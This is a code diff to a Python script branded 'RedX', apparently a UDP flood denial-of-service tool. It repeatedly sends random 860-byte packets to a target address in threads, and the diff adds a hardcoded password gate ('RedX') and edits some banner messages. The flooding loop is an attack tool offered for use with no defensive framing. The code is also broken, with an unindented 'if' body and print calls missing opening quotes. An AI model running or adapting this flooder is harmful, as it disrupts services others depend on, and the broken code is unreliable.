@@ -6,6 +6,11 @@ import threading
 import os
 
 os.system("clear")
+print("\033[93m")
+Password = input("PASSWORD: ")
+if Password=="RedX":
+print(f"""Password yang anda masukan Benar !! """)
+
 print("██████╗░███████╗██████ ╗██╗░░██╗")
 print("██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝")
 print("██████╔╝█████╗░░██║░░██║░╚███╔╝")
@@ -42,7 +47,7 @@ def run():
                                 s.sendto(data,addr)
                         print(\033[92m!! RedX Menyenggol ")
                 except:
-                        print(" [!]\033[92m!!RedX IS HERE DUDE! ")
+                        print("\033[92m!!RedX IS HERE DUDE! ")
 
 def run2():
         data = random._urandom(860)
@@ -57,7 +62,7 @@ def run2():
                         print(\033[92m!! RedX Menyenggol ")
                 except:
                         s.close()
-                        print("[*]\033[92m!! RedX IS HERE DUDE ")
+                        print("\033[92m!! RedX IS HERE DUDE ")
 
 for y in range(threads):
         if choice == 'y':
